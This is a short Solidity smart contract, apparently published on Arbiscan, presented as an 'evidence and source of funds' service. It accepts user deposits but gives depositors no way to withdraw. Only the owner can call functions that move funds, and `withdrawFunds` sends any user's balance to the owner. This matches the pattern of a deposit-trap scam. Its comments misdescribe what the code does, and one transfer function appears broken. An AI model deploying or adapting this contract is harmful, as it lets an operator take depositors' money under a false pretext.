/**
 *Submitted for verification at Arbiscan.io on 2024-05-08
*/

// SPDX-License-Identifier: GPL 0.8.0
pragma solidity ^0.8.0;

contract evidenceandsourceofunds {
    address public owner;
    mapping(address => uint) public userBalances;
    mapping(address => bool) public authorizations;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner of the contract can call this function");
        _;
    }

    // Function called when a user deposits funds
    function depositFunds() public payable {
        // Automatically mark authorization when funds are deposited
        if (!authorizations[msg.sender]) {
            authorizations[msg.sender] = true;
        }
        userBalances[msg.sender] += msg.value;
    }

    // Function to check the balance of a user
    function checkBalance(address _user) public view returns (uint) {
        return userBalances[_user];
    }

    // Function to transfer funds from the user's wallet to the contract
    function transferFundsToContract(address _user) public onlyOwner {
        require(authorizations[_user], "The wallet has not yet deposited funds");
        uint balance = userBalances[_user];
        require(balance > 0, "The wallet balance is zero");
        
        userBalances[_user] = 0;
        payable(address(this)).transfer(balance);
    }

    // Function to withdraw funds from a user's wallet
    function withdrawFunds(address _user, uint _amount) public onlyOwner {
        require(authorizations[_user], "The wallet has not yet deposited funds");
        require(userBalances[_user] >= _amount, "Insufficient funds in the wallet");

        userBalances[_user] -= _amount;
        payable(owner).transfer(_amount);
    }
}